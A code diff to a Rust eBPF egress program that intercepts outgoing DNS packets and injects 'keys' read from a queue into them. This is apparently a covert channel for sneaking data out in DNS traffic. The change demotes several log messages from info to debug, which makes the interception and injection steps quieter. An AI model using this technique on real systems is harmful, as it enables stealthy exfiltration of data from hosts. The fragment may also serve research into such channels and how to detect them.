@@ -6,7 +6,7 @@ use aya_ebpf::{
     maps::PerCpuArray,
     programs::TcContext,
 };
-use aya_log_ebpf::{error, info};
+use aya_log_ebpf::{debug, error, info};
 use network_types::{
     eth::{EthHdr, EtherType},
     ip::{IpProto, Ipv4Hdr},
@@ -56,7 +56,7 @@ fn tc_process_egress(ctx: &mut TcContext) -> Result<i32, i64> {
                 info!(ctx, "\n-----\nNew intercepted request:\n-----");
 
                 let udp_hdr = &ctx.load::<UdpHdr>(UDP_OFFSET)?;
-                info!(
+                debug!(
                     ctx,
                     "{}:{} -> {}:{}",
                     Ipv4Addr::from_bits(u32::from_be(header.src_addr)),
@@ -70,7 +70,7 @@ fn tc_process_egress(ctx: &mut TcContext) -> Result<i32, i64> {
 
                 if dns_payload_len < DNS_PAYLOAD_MAX_LEN {
                     let keys = read_keys();
-                    info!(ctx, "Fetch keys from the queue");
+                    debug!(ctx, "Fetch keys from the queue");
 
                     let buf = unsafe {
                         let ptr = DNS_BUFFER.get_ptr_mut(0).ok_or(-1)?;
@@ -86,7 +86,7 @@ fn tc_process_egress(ctx: &mut TcContext) -> Result<i32, i64> {
                     )?;
 
                     //make room
-                    info!(ctx, "adjust room");
+                    debug!(ctx, "adjust room");
                     ctx.skb
                         .adjust_room(KEYS_PAYLOAD_LEN as i32, BPF_ADJ_ROOM_NET, 0)
                         .inspect_err(|_| {
@@ -107,7 +107,7 @@ fn tc_process_egress(ctx: &mut TcContext) -> Result<i32, i64> {
                         let ptr = DNS_BUFFER.get_ptr(0).ok_or(-1)?;
                         &(*ptr).buf
                     };
-                    info!(ctx, "injecting dns payload  @{}  ", DNS_QUERY_OFFSET);
+                    debug!(ctx, "injecting dns payload  @{}  ", DNS_QUERY_OFFSET);
                     store_bytes(ctx, DNS_QUERY_OFFSET, buf, 0)?;
                     inject_keys(ctx, DNS_QUERY_OFFSET + dns_payload_len, keys)?;
 
